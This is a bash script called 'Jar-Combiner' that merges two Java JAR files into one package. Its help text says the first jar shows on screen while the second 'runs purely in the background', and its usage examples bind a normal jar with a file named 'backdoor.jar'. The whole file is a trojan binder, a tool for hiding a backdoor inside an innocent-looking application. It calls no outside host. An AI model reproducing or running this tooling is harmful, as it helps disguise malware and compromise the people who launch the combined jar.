#!/bin/bash

Help()
{
    echo "Jar-Combiner V 1.0"
    echo "----------------------------"
    echo "'"
    echo "Command Line Options"
    echo "   Three Types"
    echo "       \"j\" is for the path to the jar"
    echo "       \"p\" is for the path in the jar, to the entrypoint"
    echo "       \"h\" is for the path to an HTML file, that can launch the jar"
    echo "'"
    echo " You must supply a \"j\" AND either a \"p\" OR an \"h\" for each jar."
    echo "'"
    echo "   Every argument is appended with either a \"1\" or a \"2\" to refer to either the first or the second jar."
    echo "'"
    echo "   **NOTE** Remember, the first jar has access to the screen, the second jar runs purely in the background."
    echo "'"
    echo "Examples"
    echo "   ./joining.sh -j1 /tmp/myjar.jar -h1 /tmp/myhtml.html -j2 /tmp/backdoor.jar -h2 /tmp/backdoor.html"
    echo "'"
    echo "   ./joining.sh -j1 /tmp/myjar.jar -p1 myEntry.class -j2 /tmp/backdoor.jar -p2 backdoor.class"
}

autoCore()
{
	jarOne="$1"
	jarTwo="$2"
	javac -Xlint Combine.java
	mkdir app
	cp "$jarOne" app
	mv Combine.class app
	cd app
	jar xf "$jarOne"
	
	jarOne=$( echo $jarOne | sed s:^.*"\/":"\/": )
	jarOne=$( echo $jarOne | cut -c2- )
	
	rm -rf META-INF
	rm -rf "$jarOne"
	cd ..
	cp "$jarTwo" app
	cd app
	jar xf "$jarTwo"
	rm -rf META-INF
	
	jarTwo=$( echo $jarTwo | sed s:^.*"\/":"\/": )
	jarTwo=$( echo $jarTwo | cut -c2- )
	
	rm -rf "$jarTwo"
	jar cf finished.jar *
	cd ..
	cd ..
	cd ..
	cd ..
	cp "Linux/backBone/tempFolder/app/finished.jar" Linux
	cd Linux
	cd backBone
	rm -rf tempFolder
	cd ..
	
	

}

auto()
{
	jarOne=
	jarTwo=
	HtmlOne=
	HtmlTwo=
	pathOne=
	pathTwo=
	if [ "$1" = "help" ]
	then
		Help
	elif [ "$8" = "" ]
	then
		echo "not enogh inputs, please refer to  \"joining help\""
	elif [ true ]
	then
		if [ "$1" = "-h1" ]
		then
		HtmlOne="$2"
		fi
		if [ "$3" = "-h1" ]
		then
		HtmlOne="$4"
		fi
		if [ "$5" = "-h1" ]
		then
		HtmlOne="$6"
		fi
		if [ "$7" = "-h1" ]
		then
		HtmlOne="$8"
		fi

		if [ "$1" = "-h2" ]
		then
		HtmlTwo="$2"
		fi
		if [ "$3" = "-h2" ]
		then
		HtmlTwo="$4"
		fi
		if [ "$5" = "-h2" ]
		then
		HtmlTwo="$6"
		fi
		if [ "$7" = "-h2" ]
		then
		HtmlTwo="$8"
		fi
		
		if [ "$1" = "-j1" ]
		then
		jarOne="$2"
		fi
		if [ "$3" = "-j1" ]
		then
		jarOne="$4"
		fi
		if [ "$5" = "-j1" ]
		then
		jarOne="$6"
		fi
		if [ "$7" = "-j1" ]
		then
		jarOne="$8"
		fi

		if [ "$1" = "-j2" ]
		then
		jarTwo="$2"
		fi
		if [ "$3" = "-j2" ]
		then
		jarTwo="$4"
		fi
		if [ "$5" = "-j2" ]
		then
		jarTwo="$6"
		fi
		if [ "$7" = "-j2" ]
		then
		jarTwo="$8"
		fi

		if [ "$1" = "-p1" ]
		then
		pathOne="$2"
		fi
		if [ "$3" = "-p1" ]
		then
		pathOne="$4"
		echo "$4"
		fi
		if [ "$5" = "-p1" ]
		then
		pathOne="$6"
		fi
		if [ "$7" = "-p1" ]
		then
		pathOne="$8"
		fi

		if [ "$1" = "-p2" ]
		then
		pathTwo="$2"
		fi
		if [ "$3" = "-p2" ]
		then
		pathTwo="$4"
		fi
		if [ "$5" = "-p2" ]
		then
		pathTwo="$6"
		fi
		if [ "$7" = "-p2" ]
		then
		pathTwo="$8"
		fi
		
		cd backBone
		mkdir tempFolder
		cp "openHTML.class" tempFolder
		cd tempFolder
		
		if [ "$HtmlOne" = "" ] && [ "$HtmlTwo" = "" ]
		then
			java openHTML "$pathOne" "$jarOne" "$pathTwo" "$jarTwo" bothpath
		fi
		
		if [ "$pathOne" = "" ] && [ "$pathTwo" = "" ]
		then
			java openHTML "$HtmlOne" "$jarOne" "$HtmlTwo" "$jarTwo" bothHTML
		fi
		
		if [ "$HtmlOne" = "" ] && [ "$pathTwo" = "" ]
		then
			java openHTML "$pathOne" "$jarOne" "$HtmlTwo" "$jarTwo" PathOneHTMLTwo
		fi
		
		if [ "$pathOne" = "" ] && [ "$HtmlTwo" = "" ]
		then
			java openHTML "$HtmlOne" "$jarOne" "$pathTwo" "$jarTwo" HtmlOnePathTwo
		fi
		
		autoCore "$jarOne" "$jarTwo"
		
	
	fi
	
}

manaull()
{
	jarOne=
	infoJarOne=
	#this is uesed to either hold a html file location or the path location
	jarOneExtra=
	jarTwo=
	infoJarTwo=
	jarTwoExtra=
	
	quit="false"

	echo 'Jar Combiner' 
	echo '                      ^__^                         '
	echo '     |)|)  ---       (O  O)DDDDDDDDDD===   ==> --- '
	echo '    (o_o)  ---      (>>_<<)DDDDDDDDDD   ===    --- '
	echo '    (")(") ---         (")(")   (")(")         --- '


	echo ""
	echo 'Please enter something to start type "help" if you want help'


	#Getting the location of Jar One
	while [ "$quit" != "true" ]; do
	   echo "Please enter Jar One"
	   read jarOne
		
		if [ "$jarOne" = "q!" ]
		then
			quit="true"
		elif [ "$jarOne" = "help" ]
		then
			Help
		elif [ -f "$jarOne" ]
		then
			break
		else
			echo "File does not exist, please rety"
		fi
		
	done
	
	#Finding out if jarOne has a html file or a path location
	while [ "$quit" != "true" ]; do
	   echo "Do you have a html of a path location of Jar One"
	   echo "Type p for path"
	   echo "Type h for html"
	   read infoJarOne
		
		if [ "$infoJarOne" = "q!" ]
		then
			quit="true"
			break
		elif [ "$infoJarOne" = "help" ]
		then
			Help
		elif [ "$infoJarOne" =  "p" ] 
		then
			break
			
		elif [ "$infoJarOne" = "h" ]
		then
			break
		else
			echo 'You have to enter a "p" or a "h" '
		fi
	done
	#Getting input for 
	while [ "$quit" != "true" ]; do
	  	
		if [ "$infoJarOne" = "p" ]
		then
			echo "Please enter the path location:"
			read jarOneExtra
			if [ "$jarOneExtra" = "q!" ]
			then
				quit="true"
				break
			elif [ "$jarOneExtra" = "help" ]
			then
				Help
			else
				break
			fi
		elif [ "$infoJarOne" == "h" ]
		then
			echo "Please enter the html location:"
			read jarOneExtra
			if [ "$jarOneExtra" = "q!" ]
			then
				quit="true"
				break
			elif [ "$jarOneExtra" = "help" ]
			then
				Help
			elif [ -f "$jarOneExtra" ]
			then
				break
			else
				echo "File does not exsist"
			fi
		fi
		
	done
	
	
	
	#Getting the location of Jar Two
	while [ "$quit" != "true" ]; do
	   echo "Please enter Jar Two"
	   read jarTwo
		
		if [ "$jarTwo" = "q!" ]
		then
			quit="true"
		elif [ "$jarTwo" = "help" ]
		then
			Help
		elif [ -f "$jarTwo" ]
		then
			break
		else
			echo "File does not exist, please rety"
		fi
		
	done
	
	#Finding out if jarOne has a html file or a path location
	while [ "$quit" != "true" ]; do
	   echo "Do you have a html of a path location of Jar Two"
	   echo "Type p for path"
	   echo "Type h for html"
	   read infoJarTwo
		
		if [ "$infoJarTwo" = "q!" ]
		then
			quit="true"
			break
		elif [ "$infoJarTwo" = "help" ]
		then
			Help
		elif [ "$infoJarTwo" =  "p" ]
		then
			break
		elif [ "$infoJarTwo" = "h" ]
		then
			break
		else
			echo 'You have to enter a "p" or a "h" '
		fi
	done
	
	#Getting input for 
	while [ "$quit" != "true" ]; do
	  	
		if [ "$infoJarTwo" = "p" ]
		then
			echo "Please enter the path location:"
			read jarTwoExtra
			if [ "$jarTwoExtra" = "q!" ]
			then
				quit="true"
				break
			elif [ "$jarTwoExtra" = "help" ]
			then
				Help
			else
				break
			fi
		elif [ "$infoJarTwo" == "h" ]
		then
			echo "Please enter the html location:"
			read jarTwoExtra
			if [ "$jarTwoExtra" = "q!" ]
			then
				quit="true"
				break
			elif [ "$jarTwoExtra" = "help" ]
			then
				Help
			elif [ -f "$jarTwoExtra" ]
			then
				break
			else
				echo "File does not exsist"
			fi
		fi
		
	done
	
	cd backBone
	mkdir tempFolder
	cp "openHTML.class" tempFolder
	cd tempFolder
	
	
	if [ "$infoJarOne" = "p" ] && [ "$infoJarTwo" = "p" ]
	then
		java openHTML "$jarOneExtra" "$jarOne" "$jarTwoExtra" "$jarTwo" bothpath
	fi
	
	if [ "$infoJarOne" = "h" ] && [ "$infoJarTwo" = "h" ]
	then
		java openHTML "$jarOneExtra" "$jarOne" "$jarTwoExtra" "$jarTwo" bothHTML
	fi
	
	if [ "$infoJarOne" = "p" ] && [ "$infoJarTwo" = "h" ]
	then
		java openHTML "$jarOneExtra" "$jarOne" "$jarTwoExtra" "$jarTwo" PathOneHTMLTwo
	fi
	
	if [ "$infoJarOne" = "h" ] && [ "$infoJarTwo" = "p" ]
	then
		java openHTML "$jarOneExtra" "$jarOne" "$jarTwoExtra" "$jarTwo" HtmlOnePathTwo
	fi
	
	autoCore "$jarOne" "$jarTwo"

}




if [ "$1" != "" ]
then
	auto "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8"
elif [ "$1" == "help" ]
then
    Help
else
	manaull "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8"
fi
